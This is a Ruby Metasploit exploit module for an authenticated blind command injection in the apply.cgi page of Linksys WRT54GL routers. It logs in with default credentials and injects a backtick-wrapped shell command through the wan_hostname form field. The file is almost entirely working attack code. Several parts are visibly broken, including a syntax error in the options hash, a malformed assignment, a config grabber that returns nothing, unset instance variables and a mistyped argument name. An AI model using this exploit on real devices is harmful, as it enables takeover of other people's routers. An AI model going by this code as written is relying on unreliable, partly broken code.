#!/usr/bin/env ruby

require 'open-uri'
require 'net/http'

require 'metasploit'

PATH = '/apply.cgi'

metadata = {
  name: 'Linksys WRT54GL apply.cgi Command Execution',
  rank: 'manual',
  type: 'remote_exploit_cmd_stager',
  description: %q{
      Some Linksys Routers are vulnerable to an authenticated OS command injection in
    the Web Interface. Default credentials are admin/admin or admin/password. Since it
    is a blind os command injection vulnerability, there is no output for the executed
    command when using the cmd generic payload. A ping command against a controlled
    system could be used for testing purposes. The user must be prudent when using this
    module since it modifies the router configuration while exploitation, even when it
    tries to restore previous values.
  },
  authors: [
    'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module
    'juan vazquez' # minor help with msf module
  ],
  references: [
    {type: 'OSVDB', ref: '89912'},
    {type: 'BID', ref: '57459'},
    {type: 'EDB', ref: '24202'},
    {type: 'URL', ref: 'http://www.s3cur1ty.de/m1adv2013-001'}
  ],
  date: 'Jan 18 2013',
  privileged: true,
  platform: %w{ linux unix },
  payload: {'command_stager_flavor' => 'wget'},
  targets: [
    {arch: 'mipsle', platform: 'linux'}
  ],
  options: {
    rhost: {type: 'address', description: 'target host', required: true},
    rport: {type: 'port', description: 'target port', default: 80, required: true},
    username: {type: 'string', description: 'the username to authenticate as', default: 'admin', required: true},
    password: {type: 'string', description: 'the password to authenticate with', default: 'admin', required: true},
    restore_conf: {type: 'bool', description: 'Should we try to restore the original configuration', default: true required: true}
  }
}

def get_config(config, pattern)
  if config =~ Regexp.new(pattern)
    return $1
  end
  return ""
end

def grab_config(rhost, rport, user, pass)
  config  = {}

  Metasploit.log("Trying to download the original configuration")
  begin
    res = open("http://#{rhost}:#{rport}/index.asp", 'r', nil, http_basic_authentication: [user, pass]).read
    if res && [200, 301, 302].include?(res.status.first)
      if res.contain? 'lan_ipaddr_0'
        Metasploit.log "Successful downloaded the configuration", level: 'good'
      else
        Metasploit.log "Download of the original configuration not possible", level: 'error'
        return
      end
    else
      Metasploit.log "No successful login possible with #{user}/#{pass}", level: 'error'
      return
    end
  # TODO: replace standard library exception
  rescue ConnectionError
    Metasploit.log "Failed to connect to the web server", level: 'error'
    return
  end

  #now_proto and wan_proto should be the same and it should be dhcp! Nothing else tested!
  config[:now_proto_orig] = get_config(res, "<input\ type=hidden\ name=now_proto\ value=\'(.*)\'>")
  if !config[:now_proto_orig].contain? 'dhcp'
    Metasploit.log "Configuration not recognized, aborting to avoid breaking the device", level: 'error'
    return
  end
  config[:wan_proto_orig] = get_config(res, "var\ wan_proto\ =\ \'(.*)\'\;")
  if !config[:wan_proto_orig].contain? 'dhcp'
    Metasploit.log "Configuration not recognized, aborting to avoid breaking the device", level: 'error'
    return
  end
  config[:lan_proto_orig] = get_config(res, "<input\ type=\"radio\"\ name=\"lan_proto\"\ value=\"(.*)\"\ checked\ onClick=\"SelDHCP")
  config[:daylight_time_orig] = get_config(res, "<input\ type=hidden\ name=daylight_time\ value=(.*)>")
  config[:lan_ipaddr_orig] = get_config(res, "<input\ type=hidden\ name=\"lan_ipaddr\"\ value=(.*)>")
  config[:wait_time_orig] = get_config(res, "<input\ type=hidden\ name=\"wait_time\"\ value=(.*)>")
  config[:need_reboot_orig] = get_config(res, "<input\ type=hidden\ name=\"need_reboot\"\ value=(.*)>")
  config[:lan_ipaddr_0_orig] = get_config(res, "onBlur\=valid_range\\(this\,1\,223\,\"IP\"\\)\ size=3\ value=\'(.*)\'\ name=\"lan_ipaddr_0\"\>")
  config[:lan_ipaddr_1_orig] = get_config(res, "\<INPUT\ class=num\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"IP\"\\)\ size=3\ value=\'(.*)\'\ name=\"lan_ipaddr_1\">")
  config[:lan_ipaddr_2_orig] = get_config(res, "\<INPUT\ class=num maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"IP\"\\)\ size=3\ value=\'(.*)\'\ name=\"lan_ipaddr_2\">")
  config[:lan_ipaddr_3_orig] = get_config(res, "<INPUT class=num maxLength=3\ onBlur=\"valid_range\\(this,1,254,'IP'\\)\;Sel_SubMask\\(this.form.lan_netmask,this.form\\);\"\ size=3" \
  "\ value='(.*)'\ name=\"lan_ipaddr_3\"><\/TD>")
  config[:router_name_orig] = get_config(res, "name=\"router_name\"\ size=\"20\"\ value=\'(.*)\'\ onBlur=valid_name\\(this\,\"Router%20Name\"\\)><\/FONT><\/TD>")
  config[:wan_domain_orig] = get_config(res, "name=\"wan_domain\"\ size=\"20\"\ value=\'(.*)\'\ onBlur=valid_name\\(this\,\"Domain%20name\"\,SPACE_NO\\)><\/FONT><\/TD>")
  config[:wan_hostname_orig] = get_config(res, "<INPUT\ maxLength=39\ name=\"wan_hostname\"\ size=\"20\"\ value=\'(.*)\'\ onBlur=valid_name\\(this\,\"Host%20Name\"\\)><\/FONT><\/TD>")
  config[:wan_mtu_orig =] get_config(res, "<INPUT\ class=num\ maxLength=4\ onBlur=valid_mtu\\(this\\)\ size=5\ value='(.*)'\ name=\"wan_mtu\"><\/TD>")
  if config[:wan_mtu_orig].to_i > 1500
    config[:mtu_enable] = "0"
  end
  config[:ui_language_orig] = get_config(res, "<SCRIPT\ language=\"Javascript\"\ type=\"text\/javascript\" src=\"(.*)_lang_pack\/capsec.js\"><\/SCRIPT>")
  config[:dhcp_lease_orig] = get_config(res, "<INPUT\ maxLength=4\ onBlur=valid_range\\(this\,0\,9999\,\"DHCP%20Lease%20Time\"\\)\ size=4\ value=\'(.*)\'\ name=\"dhcp_lease\"\ class=num")
  config[:dhcp_num_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,1\,253\,\"Number%20of%20DHCP%20users\"\\)\;Sel_SubMask_onblur\\(this.form.lan_netmask\,this.form\\)" \
    "\ size=3\ value=\'(.*)\'\ name=\"dhcp_num\"\ class=num><\/TD>")
  config[:dhcp_start_orig] = get_config(res, "Sel_SubMask_onblur\\(this.form.lan_netmask\,this.form\\)\ size=3\ value=\'(.*)\'\ name=\"dhcp_start\"\ class=num\ " \
    "onChange=\"valid_dhcpd_start_ip\\(this.form\,\ this\\)\">")
  config[:netmask_orig] = get_config(res, "value=.*\ selected\>255\.255\.255\.(.*)\<\/OPTION\>")
  config[:wan_dns_orig] = get_config(res, "<input\ type=hidden\ name=wan_dns\ value=(.*)><INPUT\ maxLength=3")
  config[:wan_dns0_0_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns0_0\"\ class=num\>")
  config[:wan_dns0_1_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\' name=\"wan_dns0_1\"\ class=num\>")
  config[:wan_dns0_2_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns0_2\"\ class=num\>")
  config[:wan_dns0_3_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns0_3\"\ class=num\>")
  config[:wan_dns1_0_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns1_0\"\ class=num\>")
  config[:wan_dns1_1_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\' name=\"wan_dns1_1\"\ class=num\>")
  config[:wan_dns1_2_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns1_2\"\ class=num\>")
  config[:wan_dns1_3_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns1_3\"\ class=num\>")
  config[:wan_dns2_0_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns2_0\"\ class=num\>")
  config[:wan_dns2_1_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\' name=\"wan_dns2_1\"\ class=num\>")
  config[:wan_dns2_2_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns2_2\"\ class=num\>")
  config[:wan_dns2_3_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"DNS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_dns2_3\"\ class=num\>")
  config[:wan_wins_orig] = get_config(res, "<input\ type=hidden\ name=wan_wins\ value=(.*)><INPUT\ maxLength=3")
  config[:wan_wins_0_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,223\,\"WINS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_wins_0\"\ class=num>")
  config[:wan_wins_1_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"WINS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_wins_1\"\ class=num>")
  config[:wan_wins_2_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,255\,\"WINS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_wins_2\"\ class=num>")
  config[:wan_wins_3_orig] = get_config(res, "<INPUT\ maxLength=3\ onBlur=valid_range\\(this\,0\,254\,\"WINS\"\\)\ size=3\ value=\'(.*)\'\ name=\"wan_wins_3\"\ class=num>")
end

def restore_conf(config, rhost, rport, user ,pass)
  # we have used most parts of the original configuration
  # just need to restore wan_hostname
  cmd = @wan_hostname_orig.to_s
  # TODO: finish converting to Metasploit.log
  print_status("#{rhost}:#{rport} - Asking the Linksys device to reload original configuration")

  res = request(cmd, config, rhost, rport, user, pass)

  if (!res)
    fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to reload original configuration")
  end

  #the device needs around 10 seconds to apply our current configuration
  print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
  select(nil, nil, nil, @timeout)
end

def request(cmd, config, rhost, rport, user, pass)
  begin
    req = Net::HTTP::Post.new URI("http://#{rhost}:#{rport}/#{PATH}")
    req.basic_auth user, pass
    # TODO: use config
    req.set_form_data {
      'submit_button' => "index",
      'change_action' => "1",
      'submit_type' => "1",
      'action' => "Apply",
      'now_proto' => @now_proto_orig.to_s,
      'daylight_time' => @daylight_time_orig.to_s,
      'lan_ipaddr' => @lan_ipaddr_orig.to_s,
      'wait_time' => @wait_time_orig.to_s,
      'need_reboot' => @need_reboot_orig.to_s,
      'ui_language' => @ui_language_orig,
      'wan_proto' => @wan_proto_orig.to_s,
      'router_name' => @router_name_orig.to_s,
      'wan_hostname' => cmd,
      'wan_domain' => @wan_domain_orig.to_s,
      'mtu_enable' => @mtu_enable.to_s,
      'wan_mtu' => @wan_mtu_orig.to_s,
      'lan_ipaddr_0' => @lan_ipaddr_0_orig.to_s,
      'lan_ipaddr_1' => @lan_ipaddr_1_orig.to_s,
      'lan_ipaddr_2' => @lan_ipaddr_2_orig.to_s,
      'lan_ipaddr_3' => @lan_ipaddr_3_orig.to_s,
      'lan_netmask' => "255.255.255.#{@netmask_orig}",
      'lan_proto' => @lan_proto_orig.to_s,
      'dhcp_check' => "1",
      'dhcp_start' => @dhcp_start_orig.to_s,
      'dhcp_num' => @dhcp_num_orig.to_s,
      'dhcp_lease' => @dhcp_lease_orig.to_s,
      'wan_dns' => @wan_dns_orig.to_s,
      'wan_dns0_0' => @wan_dns0_0_orig.to_s,
      'wan_dns0_1' => @wan_dns0_1_orig.to_s,
      'wan_dns0_2' => @wan_dns0_2_orig.to_s,
      'wan_dns0_3' => @wan_dns0_3_orig.to_s,
      'wan_dns1_0' => @wan_dns1_0_orig.to_s,
      'wan_dns1_1' => @wan_dns1_1_orig.to_s,
      'wan_dns1_2' => @wan_dns1_2_orig.to_s,
      'wan_dns1_3' => @wan_dns1_3_orig.to_s,
      'wan_dns2_0' => @wan_dns2_0_orig.to_s,
      'wan_dns2_1' => @wan_dns2_1_orig.to_s,
      'wan_dns2_2' => @wan_dns2_2_orig.to_s,
      'wan_dns2_3' => @wan_dns2_3_orig.to_s,
      'wan_wins' => @wan_wins_orig.to_s,
      'wan_wins_0' => @wan_wins_0_orig.to_s,
      'wan_wins_1' => @wan_wins_1_orig.to_s,
      'wan_wins_2' => @wan_wins_2_orig.to_s,
      'wan_wins_3' => @wan_wins_3_orig.to_s,
      'time_zone' => "-08+1+1",		#default is ok
      '_daylight_time' => '1'			#default is ok
    }
    return Net::HTTP.start(rhost, rport.to_i) do |http|
      http.request(req)
    end
  # TODO: replace with stdlib exception
  rescue ::Rex::ConnectionError
    vprint_error("#{rhost} - Failed to connect to the web server")
    return nil
  end

end

def exploit(args)
  user = args['username']
  pass = args['password']
  rhost = args['rhost']
  rport = args['rport']
  restore = args['restore_conf']
  cmd = "`#{args['command']}`"
  timeout = 10

  config = grab_config(rhost, rport, user, pass)
  res = request(cmd, config, rhost, rport, user, pass)
  if res
    Metasploit.log "Blind exploitation - unknown exploitation state"
  else
    Metasploit.log "Unable to execute payload", level: 'error'
  end

  Metasploit.log "Waiting #{timeout} seconds for reloading the configuration"
  sleep(timeout)

  restore_conf(config, rhost, rport, user, pass) if restore
end

def hard_check(args)
  Metasploit.logging_prefix = "#{args['rhost']}:#{args['rport']} - "

  if grab_config(arg['username'], args['password'])
    'vulnerable'
  else
    'safe'
  end
end

def run(args)
  Metasploit.logging_prefix = "#{args['rhost']}:#{args['rport']} - "
  exploit(args)
end

if __FILE__ == $PROGRAM_NAME
  Metasploit.run(metadata, method(:run), hard_check: method(:hard_check))
end
